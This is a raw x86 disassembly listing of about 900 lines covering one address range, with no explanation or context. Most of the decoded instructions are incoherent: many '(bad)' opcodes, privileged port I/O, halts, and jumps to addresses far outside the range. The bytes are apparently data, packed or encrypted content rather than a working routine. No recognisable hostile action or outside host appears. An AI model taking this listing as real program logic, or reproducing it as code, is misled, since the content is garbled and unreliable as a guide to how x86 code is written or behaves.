  4159cd:	pop    es
  4159ce:	movlps QWORD PTR [eax],xmm4
  4159d1:	ss add eax,0x174f8b2e
  4159d7:	loope  0x4159b0
  4159d9:	adc    eax,0x1a035df4
  4159de:	and    al,0x86
  4159e0:	enter  0xf172,0x35
  4159e4:	jge    0x4159ed
  4159e6:	mov    bl,0xc2
  4159e8:	add    DWORD PTR [edi-0x51280b09],ebx
  4159ee:	cmp    DWORD PTR [esi-0x4a7a8a73],0xa6a2ff4a
  4159f8:	rcr    DWORD PTR [edi+0x10],0x27
  4159fc:	mov    al,BYTE PTR [esi+0x6]
  4159ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a00:	cmp    al,0xf3
  415a02:	ds adc al,0x70
  415a05:	cs mov ecx,0x9b17893e
  415a0b:	fst    DWORD PTR [ebx+ebx*8-0xb]
  415a0f:	mov    dl,0xc5
  415a11:	call   0xa584dd9e
  415a16:	jmp    0x277ddc72
  415a1b:	ret    0x88dd
  415a1e:	cmp    al,0x8a
  415a20:	stos   BYTE PTR es:[edi],al
  415a21:	lea    esi,[eax+0xfe57c2b]
  415a27:	lea    edx,[esi]
  415a29:	ror    DWORD PTR es:[ebx-0x71],0x64
  415a2e:	push   es
  415a2f:	cwde   
  415a30:	cmp    dh,BYTE PTR [ecx-0x42]
  415a33:	jmp    0x415a6a
  415a35:	(bad)  
  415a36:	(bad)  
  415a37:	hlt    
  415a38:	mov    cl,0x43
  415a3a:	or     al,0x41
  415a3c:	pop    esi
  415a3d:	fdivr  QWORD PTR [ecx+0x551cb8df]
  415a43:	aaa    
  415a44:	mov    DWORD PTR [edi-0x4fc3f65e],ebp
  415a4a:	inc    edi
  415a4b:	jo     0x415a65
  415a4d:	out    0x87,al
  415a4f:	gs push ebp
  415a51:	jnp    0x415ac0
  415a53:	aaa    
  415a54:	pop    edi
  415a55:	scas   eax,DWORD PTR es:[edi]
  415a56:	scas   al,BYTE PTR es:[edi]
  415a57:	or     ecx,DWORD PTR cs:[ebx-0x3e]
  415a5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a5c:	mov    dl,0x9b
  415a5e:	pop    ebp
  415a5f:	inc    ebp
  415a60:	leave  
  415a61:	pop    esp
  415a62:	and    al,0xfd
  415a64:	mov    ds:0xc74d20cc,al
  415a69:	xor    al,0x68
  415a6b:	loopne 0x415a16
  415a6d:	mov    edx,0xcd061e53
  415a72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a73:	jecxz  0x415a9c
  415a75:	push   edx
  415a76:	jmp    0xb1300b8b
  415a7b:	push   es
  415a7c:	sub    BYTE PTR [eax-0x24fb1e0e],dh
  415a82:	and    esp,ebx
  415a84:	pop    esp
  415a85:	jl     0x415aa2
  415a87:	clc    
  415a88:	rcr    BYTE PTR [esi-0x5dcc6130],1
  415a8e:	adc    al,BYTE PTR [eax+esi*8]
  415a91:	frstor ds:0x7a349daf
  415a97:	leave  
  415a98:	xchg   esp,eax
  415a99:	adc    al,0x88
  415a9b:	inc    ebp
  415a9c:	dec    edi
  415a9d:	mul    BYTE PTR [ebx]
  415a9f:	dec    eax
  415aa0:	adc    ebx,DWORD PTR [ecx-0x3632ec46]
  415aa6:	mov    edx,0x7c3654dd
  415aab:	lahf   
  415aac:	inc    esp
  415aad:	out    dx,al
  415aae:	test   al,0x19
  415ab0:	push   cs
  415ab1:	ss inc edx
  415ab3:	imul   eax,ebx,0x656ced2c
  415ab9:	lock dec esi
  415abb:	and    al,0xea
  415abd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415abe:	cmp    al,BYTE PTR [ebx-0x1761c304]
  415ac4:	lods   al,BYTE PTR ds:[esi]
  415ac5:	out    0xb7,al
  415ac7:	es add eax,0xb89e41cd
  415acd:	cld    
  415ace:	adc    eax,0xbfb5006c
  415ad3:	repz cmp BYTE PTR [esi],bh
  415ad6:	and    eax,0xe4169bca
  415adb:	add    bh,BYTE PTR [edi]
  415add:	nop
  415ade:	dec    edi
  415adf:	mov    eax,ds:0x7c2755ec
  415ae4:	arpl   WORD PTR [edi+0x62],si
  415ae7:	sahf   
  415ae8:	inc    edi
  415ae9:	or     cl,BYTE PTR [eax+0x2b844536]
  415aef:	scas   al,BYTE PTR es:[edi]
  415af0:	adc    dl,dl
  415af2:	push   0xda96f889
  415af7:	fild   QWORD PTR [esi+0x78625604]
  415afd:	sti    
  415afe:	cmp    al,0x7d
  415b00:	cld    
  415b01:	aad    0x4
  415b03:	and    esi,edi
  415b05:	inc    eax
  415b06:	shl    BYTE PTR [ecx],1
  415b08:	js     0x415b3b
  415b0a:	xor    al,0xf8
  415b0c:	imul   ecx,eax,0x33
  415b0f:	xor    eax,DWORD PTR [edi]
  415b11:	mov    ch,0xba
  415b13:	into   
  415b14:	dec    esi
  415b15:	int    0x1e
  415b17:	dec    esi
  415b18:	je     0x415ad8
  415b1a:	aam    0x5b
  415b1c:	ins    DWORD PTR es:[edi],dx
  415b1d:	movq   mm3,mm1
  415b20:	xor    dh,BYTE PTR ds:0xfe1a5154
  415b26:	std    
  415b27:	pop    ebx
  415b28:	stos   DWORD PTR es:[edi],eax
  415b29:	hlt    
  415b2a:	xor    al,0x70
  415b2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b2d:	and    al,dh
  415b2f:	sub    DWORD PTR [eax+0x32449795],ebp
  415b35:	or     DWORD PTR [edi-0x5554c46c],0xe972f75a
  415b3f:	retf   
  415b40:	test   DWORD PTR [edx],0x5447a801
  415b46:	les    edx,FWORD PTR [esp+ebp*4]
  415b49:	jmp    0x415b25
  415b4b:	loop   0x415b1d
  415b4d:	scas   eax,DWORD PTR es:[edi]
  415b4e:	mul    ah
  415b50:	sbb    al,0xac
  415b52:	(bad)  
  415b55:	jmp    0x7d99:0xb812470e
  415b5c:	imul   ebx,DWORD PTR [eax],0xd9e20d52
  415b62:	rol    ebx,0x19
  415b65:	aas    
  415b66:	jmp    0xcf26cf63
  415b6b:	mov    bh,ah
  415b6d:	repz lea eax,ds:0x9f6f94f0
  415b74:	xchg   DWORD PTR [edi],edi
  415b76:	jge    0x415b19
  415b78:	aam    0xe1
  415b7a:	fisub  DWORD PTR [ebx-0x760b917d]
  415b80:	push   ebx
  415b81:	mov    edi,0x2064adb6
  415b86:	and    DWORD PTR ds:0x39344122,esi
  415b8c:	pop    ecx
  415b8d:	adc    BYTE PTR [edi+ecx*4],bh
  415b90:	add    DWORD PTR [edx-0x359254f2],0xffffff99
  415b97:	or     esp,DWORD PTR [esi-0x4a]
  415b9a:	mov    ah,0x9f
  415b9c:	in     al,0x2
  415b9e:	imul   edx
  415ba0:	inc    ecx
  415ba1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ba2:	xchg   BYTE PTR cs:[ecx-0x3],ah
  415ba6:	cs retf 
  415ba8:	dec    ebp
  415ba9:	inc    edx
  415baa:	push   ss
  415bab:	mov    ebx,0x93f52dcd
  415bb0:	pop    ebp
  415bb1:	pop    ebp
  415bb2:	out    0xf0,eax
  415bb4:	xchg   edx,eax
  415bb5:	mov    eax,ds:0x7feff1b9
  415bba:	inc    edi
  415bbb:	mov    esp,0x73de67c6
  415bc0:	pop    edi
  415bc1:	out    dx,al
  415bc2:	ret    
  415bc3:	adc    al,0x5b
  415bc5:	in     al,0x60
  415bc7:	or     eax,0xa39322f2
  415bcc:	inc    esp
  415bcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bce:	fwait
  415bcf:	das    
  415bd0:	jno    0x415bc7
  415bd2:	pop    edi
  415bd3:	imul   BYTE PTR [eax]
  415bd5:	mov    esi,DWORD PTR [esi]
  415bd7:	das    
  415bd8:	dec    edx
  415bd9:	push   eax
  415bda:	(bad)  
  415bdb:	jmp    DWORD PTR [eax]
  415bdd:	push   0x64
  415bdf:	fxam   
  415be1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415be2:	xchg   ecx,edi
  415be4:	cmp    dl,BYTE PTR [eax+0x1c]
  415be7:	popa   
  415be8:	popf   
  415be9:	and    DWORD PTR [ebp+0x74a2e7ee],0xffffffdc
  415bf0:	cmp    ch,dh
  415bf2:	repz mov cl,0x45
  415bf5:	je     0x415bd3
  415bf7:	and    DWORD PTR [edi+0x330bc4a7],0xfffffff1
  415bfe:	mov    ebx,0x3e110fa7
  415c03:	mov    eax,DWORD PTR ds:0xfa17e915
  415c09:	sbb    al,0x95
  415c0b:	sub    dl,BYTE PTR [ebx-0x78740df8]
  415c11:	mov    ecx,0x159dd8d9
  415c16:	in     eax,dx
  415c17:	jle    0x415bdc
  415c19:	ror    DWORD PTR [ecx],cl
  415c1b:	pop    esi
  415c1c:	push   ebp
  415c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c1e:	pop    edx
  415c1f:	xor    cl,ah
  415c21:	sbb    BYTE PTR [edx-0x5c],ch
  415c24:	pop    es
  415c25:	mov    dl,0x4
  415c27:	pop    esp
  415c28:	in     eax,dx
  415c29:	cmc    
  415c2a:	repz ret 
  415c2c:	fiadd  WORD PTR [ecx+0x56447c4b]
  415c32:	xor    eax,edi
  415c34:	push   edx
  415c35:	inc    edi
  415c36:	cmp    DWORD PTR [ebx+0x15],0x8201a5bb
  415c3d:	mov    al,0x3
  415c3f:	mov    eax,0xd4004e7c
  415c44:	test   al,0xd3
  415c46:	jmp    0x3af47f47
  415c4b:	shl    BYTE PTR [eax-0x23],1
  415c4e:	or     ch,BYTE PTR [edi+0x2c3948f5]
  415c54:	or     eax,0x27b60d6c
  415c59:	inc    ebp
  415c5a:	(bad)  
  415c5b:	sbb    DWORD PTR [ecx+0x2b],ebx
  415c5e:	xchg   DWORD PTR [ecx*2+0x3c791ca4],esp
  415c65:	ins    BYTE PTR es:[edi],dx
  415c66:	out    0x19,eax
  415c68:	loop   0x415c68
  415c6a:	inc    ebx
  415c6b:	pop    ebp
  415c6c:	jl     0x415c10
  415c6e:	rcl    esi,0xd9
  415c71:	es in  al,dx
  415c73:	ins    DWORD PTR es:[edi],dx
  415c74:	fnstsw WORD PTR [ebx+0x6d]
  415c77:	xor    edi,DWORD PTR [ebp+0x74]
  415c7a:	add    eax,0xe84cc624
  415c7f:	dec    ebx
  415c80:	in     al,dx
  415c81:	fiadd  WORD PTR [ebp+0x63]
  415c84:	adc    ch,BYTE PTR [edx+0x6464b227]
  415c8a:	and    ebx,ebp
  415c8c:	pop    ss
  415c8d:	inc    ebp
  415c8e:	cmp    bh,BYTE PTR [edx+0x45]
  415c91:	cs push ss
  415c93:	xor    al,0x80
  415c95:	pusha  
  415c96:	pop    ecx
  415c97:	cmp    eax,0xdb893e68
  415c9c:	enter  0xfd55,0x85
  415ca0:	nop
  415ca1:	lds    esi,FWORD PTR [eax+0x2a]
  415ca4:	sbb    DWORD PTR [esi-0x2d],ebp
  415ca7:	leave  
  415ca8:	pop    esi
  415ca9:	mov    esi,0xdcc15118
  415cae:	shl    ecx,cl
  415cb0:	jl     0x415c40
  415cb2:	add    al,0x22
  415cb4:	sub    al,0x93
  415cb6:	push   0xa42dc076
  415cbb:	ss (bad) 
  415cbd:	lock sbb al,bh
  415cc0:	popf   
  415cc1:	xchg   edi,eax
  415cc2:	xchg   ecx,eax
  415cc3:	enter  0x3075,0x27
  415cc7:	test   eax,0x50a2ba80
  415ccc:	retf   0x9e7c
  415ccf:	dec    eax
  415cd0:	loop   0x415c9c
  415cd2:	push   es
  415cd3:	pop    ebx
  415cd4:	sbb    al,0x1
  415cd6:	iret   
  415cd7:	cs jg  0x415cf4
  415cda:	mov    ecx,0xc8d5ed1
  415cdf:	push   0x3e
  415ce1:	arpl   bx,di
  415ce3:	gs fucomip st,st(5)
  415ce6:	or     DWORD PTR [edx-0x31],esi
  415ce9:	arpl   WORD PTR [esi+0x5a4fc681],ax
  415cef:	(bad)  
  415cf0:	sbb    eax,0xe2da15fb
  415cf5:	jl     0x415d06
  415cf7:	repnz mov eax,ds:0xf4a74c03
  415cfd:	pushf  
  415cfe:	(bad)  
  415d00:	mov    BYTE PTR [ecx],al
  415d02:	test   BYTE PTR [esi+0x19],bh
  415d05:	pop    ebp
  415d06:	mov    eax,0xab54c3d5
  415d0b:	stos   DWORD PTR es:[edi],eax
  415d0c:	lock loop 0x415cf9
  415d0f:	cld    
  415d10:	inc    edx
  415d11:	or     BYTE PTR [ecx],dh
  415d13:	mov    al,ds:0xbf37129d
  415d18:	das    
  415d19:	stos   DWORD PTR es:[edi],eax
  415d1a:	pop    eax
  415d1b:	pushf  
  415d1c:	sbb    al,0xcf
  415d1e:	lock dec edi
  415d20:	iret   
  415d21:	int    0x78
  415d23:	push   ebp
  415d24:	mov    edi,0x71909d50
  415d29:	cmp    DWORD PTR [edi+0x3f],edi
  415d2c:	les    ecx,FWORD PTR [ecx+eax*4+0x5ca637e]
  415d33:	cmp    al,0x8b
  415d35:	loop   0x415d35
  415d37:	test   DWORD PTR [esi+0x2f],ebp
  415d3a:	jl     0x415d15
  415d3c:	cmp    DWORD PTR cs:[ebx],ecx
  415d3f:	repz ror ah,1
  415d42:	jmp    0x591bc34c
  415d47:	inc    ebx
  415d48:	sbb    bl,BYTE PTR [ebx+0x50]
  415d4b:	aas    
  415d4c:	fsub   DWORD PTR [edx]
  415d4e:	mov    esi,0x7d5720a7
  415d53:	sahf   
  415d54:	(bad)  
  415d55:	push   cs
  415d56:	mov    edi,0x9a2cb391
  415d5b:	cli    
  415d5c:	push   edi
  415d5d:	das    
  415d5e:	icebp  
  415d5f:	fcomp  QWORD PTR [edi+0x1936ddcf]
  415d65:	jns    0x415dda
  415d67:	es and eax,0x7ee9696a
  415d6d:	ins    BYTE PTR es:[edi],dx
  415d6e:	fwait
  415d6f:	jbe    0x415dec
  415d71:	nop
  415d72:	pop    ecx
  415d73:	dec    eax
  415d74:	adc    eax,0x6ab386ce
  415d79:	jmp    0x415d56
  415d7b:	pop    ds
  415d7c:	gs ret 
  415d7e:	xchg   ebx,eax
  415d7f:	in     eax,dx
  415d80:	jg     0x415d87
  415d82:	fcomp  QWORD PTR [ecx-0x57]
  415d85:	lds    esp,FWORD PTR [eax+0x42]
  415d88:	fild   QWORD PTR [edi+0x7]
  415d8b:	add    DWORD PTR [edx+edi*8+0x65],esp
  415d8f:	(bad)  
  415d90:	jns    0x415d21
  415d92:	test   BYTE PTR [eax-0x30],0x61
  415d96:	in     eax,dx
  415d97:	dec    ebp
  415d98:	call   0x41519983
  415d9d:	push   edx
  415d9e:	fnsave [ebp+0x43]
  415da1:	xchg   edx,eax
  415da2:	push   eax
  415da3:	sar    DWORD PTR [esi-0x5a0ec955],0x3b
  415daa:	test   DWORD PTR [eax],eax
  415dac:	fist   WORD PTR [esi+edi*2-0x29]
  415db0:	hlt    
  415db1:	sbb    eax,0xb6cb827a
  415db6:	cmp    BYTE PTR [esi+ecx*4],ch
  415db9:	outs   dx,DWORD PTR ds:[esi]
  415dba:	imul   edx,DWORD PTR [edi+ebx*8+0x5d],0xffffffe8
  415dbf:	pop    esi
  415dc0:	cmp    esi,DWORD PTR [ecx+0x4bf5e4d]
  415dc6:	loopne 0x415d78
  415dc8:	les    eax,FWORD PTR [eax+0x62]
  415dcb:	xor    eax,edx
  415dcd:	dec    ecx
  415dce:	(bad)  
  415dcf:	jp     0x415e28
  415dd1:	push   ss
  415dd2:	xor    ch,BYTE PTR [ebp+0x56cb560d]
  415dd8:	les    esp,FWORD PTR [ebx+0x9]
  415ddb:	in     al,0x72
  415ddd:	rcr    DWORD PTR [ebx-0x21355613],0x15
  415de4:	test   BYTE PTR ds:0xab1d53ba,cl
  415dea:	xor    ecx,DWORD PTR [edi-0x39]
  415ded:	or     BYTE PTR [edx+ebp*2+0x34],cl
  415df1:	mov    ah,BYTE PTR [edi]
  415df3:	xchg   ebx,eax
  415df4:	mov    DWORD PTR [edi-0xe],edx
  415df7:	loop   0x415dd8
  415df9:	push   esi
  415dfa:	xor    BYTE PTR [ebx-0x1f],cl
  415dfd:	xchg   ebx,eax
  415dfe:	or     al,0x94
  415e00:	mov    eax,0xa814d676
  415e05:	mov    edx,0xa24dd17
  415e0a:	push   esp
  415e0b:	(bad)  
  415e0c:	(bad)  
  415e0e:	sbb    bh,BYTE PTR [edx-0x2]
  415e11:	scas   eax,DWORD PTR es:[edi]
  415e12:	push   eax
  415e13:	jle    0x415e61
  415e15:	addr16 gs inc ebx
  415e18:	ja     0x415e3a
  415e1a:	in     al,dx
  415e1b:	add    ah,ch
  415e1d:	mov    bl,0x72
  415e1f:	cmp    al,0xc3
  415e21:	jno    0x415dad
  415e23:	test   DWORD PTR [edi+0x51],edx
  415e26:	jmp    0x415dbf
  415e28:	dec    edx
  415e29:	pop    edx
  415e2a:	(bad)  
  415e2b:	in     eax,dx
  415e2c:	cmp    al,0xa9
  415e2e:	add    al,BYTE PTR [eax+0x3]
  415e31:	add    esi,edi
  415e33:	fild   QWORD PTR [edx-0x2b836c44]
  415e39:	sbb    BYTE PTR [ebp+0x51],0xdd
  415e3d:	jno    0x415e3a
  415e3f:	add    al,0xea
  415e41:	adc    ebp,edx
  415e43:	cli    
  415e44:	mov    al,ds:0x694c54cc
  415e49:	enter  0xec59,0x77
  415e4d:	test   edx,esp
  415e4f:	adc    ebx,0x7d
  415e52:	jecxz  0x415ec6
  415e54:	mov    ecx,0x9b11aad6
  415e59:	jg     0x415e24
  415e5b:	jmp    0x415df9
  415e5d:	adc    DWORD PTR [eax],ebp
  415e5f:	outs   dx,BYTE PTR ds:[esi]
  415e60:	sahf   
  415e61:	jae    0x415dfa
  415e63:	in     al,dx
  415e64:	shl    BYTE PTR [ebx+0x39f7637e],1
  415e6a:	mov    bl,0x37
  415e6c:	or     ch,ah
  415e6e:	neg    DWORD PTR [esi]
  415e70:	or     eax,0xfbd162e1
  415e75:	rcr    eax,cl
  415e77:	and    al,0x71
  415e79:	popf   
  415e7a:	test   ah,dl
  415e7c:	scas   eax,DWORD PTR es:[edi]
  415e7d:	inc    edx
  415e7f:	add    al,0x22
  415e81:	test   eax,0xf10f6da3
  415e86:	adc    BYTE PTR [edi+ecx*4+0x3a2d2430],cl
  415e8d:	or     BYTE PTR [ebp-0xf142fb7],dh
  415e93:	adc    esi,DWORD PTR [eax+edx*4-0x476111fc]
  415e9a:	in     eax,dx
  415e9b:	xchg   dh,cl
  415e9d:	rcr    DWORD PTR [ecx+esi*4-0x777950d9],1
  415ea4:	sahf   
  415ea5:	(bad)  [ecx+0x48]
  415ea8:	ret    0xf2b9
  415eab:	mov    edx,DWORD PTR [edi]
  415ead:	and    DWORD PTR [edi+0x58],ecx
  415eb0:	push   es
  415eb1:	fs dec edi
  415eb3:	sbb    ebx,eax
  415eb5:	jp     0x415f25
  415eb7:	loop   0x415ed0
  415eb9:	into   
  415eba:	jmp    0x383c6c11
  415ebf:	dec    ecx
  415ec0:	ins    DWORD PTR es:[edi],dx
  415ec1:	mov    esp,0x9f730f82
  415ec6:	jg     0x415ec9
  415ec8:	popa   
  415ec9:	jecxz  0x415f00
  415ecb:	jns    0x415f44
  415ecd:	out    dx,al
  415ece:	ret    
  415ecf:	pop    es
  415ed0:	cmp    cl,ah
  415ed2:	pop    edi
  415ed3:	mov    ah,0xea
  415ed5:	jge    0x415e9a
  415ed7:	out    0xa4,al
  415ed9:	inc    ecx
  415eda:	jp     0x415f3a
  415edc:	jnp    0x415e70
  415ede:	sub    bh,BYTE PTR ds:[eax-0x2ba4a3df]
  415ee5:	inc    esp
  415ee6:	fistp  WORD PTR [ebx+ebx*1+0x78]
  415eea:	xchg   ebp,eax
  415eeb:	loop   0x415ed4
  415eed:	sbb    ecx,0x26a0a2cc
  415ef3:	cwde   
  415ef4:	cdq    
  415ef5:	jmp    0x11d3:0xf5d1f38b
  415efc:	mov    cl,0x74
  415efe:	xor    bh,BYTE PTR [esi-0x7f326b3f]
  415f04:	test   al,0x7e
  415f06:	or     dh,BYTE PTR [eax-0x69a387ca]
  415f0c:	bound  ebp,QWORD PTR [esi+0x51]
  415f0f:	sub    eax,0xa21a57ee
  415f14:	int    0xfd
  415f16:	dec    edi
  415f17:	push   edx
  415f18:	push   0xffffffdf
  415f1a:	push   ds
  415f1b:	mov    dl,0x52
  415f1d:	out    0xc,al
  415f1f:	sbb    eax,DWORD PTR [edx-0x3e1d6a08]
  415f25:	jnp    0x415edf
  415f27:	pop    esp
  415f28:	(bad)  [esi-0x233197cb]
  415f2e:	rcl    BYTE PTR [esi],1
  415f30:	xchg   esi,eax
  415f31:	mov    edx,0x2833b0f2
  415f36:	repz inc eax
  415f38:	mov    BYTE PTR [ebp-0x7e5c7a7a],ah
  415f3e:	jge    0x415ec5
  415f40:	fnstcw WORD PTR [esi]
  415f42:	lahf   
  415f43:	jo     0x415ee9
  415f45:	js     0x415fb0
  415f47:	push   ebx
  415f48:	ins    DWORD PTR es:[edi],dx
  415f49:	cli    
  415f4a:	out    0x7f,al
  415f4c:	push   esp
  415f4d:	sub    DWORD PTR [edi-0x1f],0xe99afc05
  415f54:	rcr    DWORD PTR [ebp-0x7a],1
  415f57:	inc    esi
  415f58:	pusha  
  415f59:	sbb    edi,DWORD PTR [ecx+0x68]
  415f5c:	pusha  
  415f5d:	mov    bh,0xe9
  415f5f:	test   esi,edx
  415f61:	popa   
  415f62:	cwde   
  415f63:	mov    dl,0x61
  415f65:	push   edi
  415f66:	pusha  
  415f67:	xchg   ebx,eax
  415f68:	(bad)  
  415f69:	dec    eax
  415f6a:	xor    al,0x70
  415f6c:	xor    eax,0x3646e602
  415f71:	lea    edi,[esi-0x7a]
  415f74:	sub    DWORD PTR [ecx+ebx*2],ebx
  415f77:	sahf   
  415f78:	lahf   
  415f79:	jae    0x415f45
  415f7b:	adc    al,0xbb
  415f7d:	pop    ecx
  415f7e:	fstp   QWORD PTR [esi+0x59]
  415f81:	rcl    BYTE PTR ds:0x30a65f97,0x79
  415f88:	push   ebx
  415f89:	add    DWORD PTR [ecx-0x2d149b68],esp
  415f8f:	mov    ds:0x8db1a386,eax
  415f94:	push   esi
  415f95:	sbb    eax,DWORD PTR [bx+si]
  415f98:	ret    0x1d3
  415f9b:	xchg   ebx,eax
  415f9c:	gs dec eax
  415f9e:	mov    ah,0x5b
  415fa0:	outs   dx,BYTE PTR ds:[esi]
  415fa1:	lods   eax,DWORD PTR ds:[esi]
  415fa2:	dec    eax
  415fa3:	outs   dx,BYTE PTR ds:[esi]
  415fa4:	mov    al,0x6e
  415fa6:	and    eax,0x920ee2fe
  415fab:	lods   al,BYTE PTR ds:[esi]
  415fac:	inc    esp
  415fad:	sub    DWORD PTR [esp+ecx*4-0x3addffe4],0x4c
  415fb5:	push   edx
  415fb6:	push   esi
  415fb7:	sbb    al,al
  415fb9:	clc    
  415fba:	fsqrt  
  415fbc:	rcr    DWORD PTR [eax+0x7d],cl
  415fbf:	test   esp,esp
  415fc1:	mov    ds:0x8883fc4,al
  415fc6:	jnp    0x416043
  415fc8:	aas    
  415fc9:	dec    edx
  415fca:	sahf   
  415fcb:	pusha  
  415fcc:	push   0x2c54eb68
  415fd1:	lock sbb BYTE PTR [ebx-0x74],0x5b
  415fd6:	outs   dx,DWORD PTR ds:[esi]
  415fd7:	adc    cl,0xaf
  415fda:	daa    
  415fdb:	push   ebx
  415fdc:	pop    ebp
  415fdd:	push   esi
  415fde:	adc    DWORD PTR [edx-0x74],esp
  415fe1:	pop    ecx
  415fe2:	sub    DWORD PTR ds:0xea02b5f8,edi
  415fe8:	or     cl,BYTE PTR [esi]
  415fea:	mov    DWORD PTR [ebx+0x14],ebx
  415fed:	xchg   ecx,eax
  415fee:	retf   
  415fef:	lods   al,BYTE PTR ds:[esi]
  415ff0:	aas    
  415ff1:	bound  edi,QWORD PTR [eax-0x2c9336a8]
  415ff7:	adc    al,0xa
  415ff9:	scas   eax,DWORD PTR es:[edi]
  415ffa:	retf   
  415ffb:	jp     0x41606b
  415ffd:	xlat   BYTE PTR ds:[ebx]
  415ffe:	sub    BYTE PTR ds:0x87b76cc6,ah
  416004:	aaa    
  416005:	in     eax,0x57
  416007:	aam    0xa2
  416009:	adc    al,0x72
  41600b:	retf   
  41600c:	sbb    al,0x67
  41600e:	retf   
  41600f:	out    0x1d,al
  416011:	cmp    cl,BYTE PTR [ecx+ecx*8]
  416014:	cld    
  416015:	fadd   QWORD PTR [eax+eiz*4]
  416018:	push   esi
  416019:	idiv   DWORD PTR [eax+eiz*1-0x38bea781]
  416020:	sub    BYTE PTR [ebx+0x3c],cl
  416023:	cld    
  416024:	mov    dl,0xa
  416026:	mov    ch,0xc6
  416028:	repnz push edi
  41602a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41602b:	inc    eax
  41602c:	sub    DWORD PTR [ebx+0x44b60861],edx
  416032:	std    
  416033:	icebp  
  416034:	in     al,0xa6
  416036:	pop    esi
  416037:	lods   al,BYTE PTR gs:[esi]
  416039:	push   edi
  41603a:	sahf   
  41603b:	push   esp
  41603c:	and    BYTE PTR [edi+eiz*1+0x7bb7dabc],al
  416043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416044:	xchg   ebx,eax
  416045:	or     al,0x1
  416047:	push   0xffffffdf
  416049:	sub    al,0x57
  41604b:	cmp    BYTE PTR [ecx+0x47],bh
  41604e:	inc    ebx
  41604f:	xor    bl,BYTE PTR [ecx-0x2f75c52d]
  416055:	xchg   esp,eax
  416056:	je     0x416094
  416058:	pop    esi
  416059:	rol    BYTE PTR [ebx+edi*2-0x37],0xce
  41605e:	fwait
  41605f:	outs   dx,DWORD PTR ds:[esi]
  416060:	xchg   ebx,eax
  416061:	mov    esp,0x4608c4a1
  416066:	sbb    ecx,eax
  416068:	ja     0x41600b
  41606a:	add    BYTE PTR [edi],bh
  41606c:	or     al,0x29
  41606e:	push   edx
  41606f:	dec    ecx
  416070:	unpckhps xmm4,XMMWORD PTR [esi+0x2bf736d6]
  416077:	lahf   
  416078:	cmp    BYTE PTR [edx],ah
  41607a:	xchg   esi,eax
  41607b:	lods   eax,DWORD PTR ds:[esi]
  41607c:	xor    ebp,DWORD PTR [ecx+0x74183886]
  416082:	rcl    DWORD PTR [ebp-0x36a051b8],cl
  416088:	jmp    0xbace7127
  41608d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41608e:	push   es
  41608f:	test   dh,bl
  416091:	test   BYTE PTR [eax+ecx*8],cl
  416094:	mov    eax,ds:0x88b744a8
  416099:	and    eax,0x883b68ab
  41609e:	call   0x88d79aa1
  4160a3:	dec    esp
  4160a4:	jo     0x41609d
  4160a6:	mov    DWORD PTR [ecx+ebx*4-0x762dfcce],esi
  4160ad:	mov    BYTE PTR [edx+0x598001cb],bl
  4160b3:	push   ebp
  4160b4:	adc    eax,0xaeb724d8
  4160b9:	shl    BYTE PTR [ebx],1
  4160bb:	xchg   edi,eax
  4160bc:	clc    
  4160bd:	mov    ah,ch
  4160bf:	push   esi
  4160c0:	cs into 
  4160c2:	push   ebp
  4160c3:	ror    DWORD PTR [edx-0x48],0x65
  4160c7:	pop    esi
  4160c8:	inc    edx
  4160c9:	dec    ebx
  4160ca:	dec    ebx
  4160cb:	outs   dx,BYTE PTR ds:[esi]
  4160cc:	inc    edx
  4160cd:	test   eax,0xa2b68764
  4160d2:	cwde   
  4160d3:	arpl   WORD PTR [eax-0x3b99ad02],sp
  4160d9:	loope  0x41607d
  4160db:	aaa    
  4160dc:	shl    BYTE PTR [ecx+edx*4+0x3b],1
  4160e0:	dec    esi
  4160e1:	mov    ecx,0xe5a077fe
  4160e6:	sbb    dl,BYTE PTR [eax]
  4160e8:	xchg   ebx,eax
  4160e9:	add    eax,0x9f34b20a
  4160ee:	pop    ds
  4160ef:	sub    ah,bl
  4160f1:	add    ch,BYTE PTR [ebx-0x400661f7]
  4160f7:	jmp    0x416152
  4160f9:	adc    BYTE PTR [eax+0x450fa9de],dh
  4160ff:	dec    BYTE PTR [eax-0x54]
  416102:	cmp    bl,ah
  416104:	(bad)  
  416105:	int    0xf
  416107:	inc    ecx
  416108:	adc    al,0x1e
  41610a:	aad    0xb9
  41610c:	ins    DWORD PTR es:[edi],dx
  41610d:	stos   DWORD PTR es:[edi],eax
  41610e:	xchg   BYTE PTR [eax-0x4],dl
  416111:	stos   BYTE PTR es:[edi],al
  416112:	iret   
  416113:	test   BYTE PTR cs:[edx],bl
  416116:	aad    0x7d
  416118:	fild   QWORD PTR [edx-0x22]
  41611b:	inc    edi
  41611c:	add    al,0xe4
  41611e:	out    dx,al
  41611f:	sbb    BYTE PTR [ecx+0x67],0xce
  416123:	jecxz  0x4161a4
  416125:	pop    ss
  416126:	(bad)  
  416127:	hlt    
  416128:	mov    edi,0xb0ebfcbd
  41612d:	out    dx,eax
  41612e:	xchg   edx,eax
  41612f:	mov    dh,0x75
  416131:	mov    dl,BYTE PTR [esi+0x60]
  416134:	(bad)  
  416135:	test   al,0x2d
  416137:	int3   
  416138:	jo     0x4160db
  41613a:	xchg   ecx,eax
  41613b:	mov    eax,ds:0xa3ac3a72
  416140:	mov    esp,0x6d29a719
  416145:	xor    ebx,DWORD PTR [ecx-0x1966a995]
  41614b:	ins    BYTE PTR es:[edi],dx
  41614c:	add    bl,dl
  41614e:	mov    dh,0xcf
  416150:	idiv   DWORD PTR [edx-0x5d7ec34c]
  416156:	loope  0x41617e
  416158:	shl    BYTE PTR [edx-0x23359cce],cl
  41615e:	inc    eax
  41615f:	lods   al,BYTE PTR ds:[esi]
  416160:	pop    ds
  416161:	cdq    
  416162:	push   edx
  416163:	pushf  
  416164:	out    dx,eax
  416165:	or     al,0xd
  416167:	(bad)
  41616a:	int3   
  41616b:	sub    edx,DWORD PTR [edi-0x17]
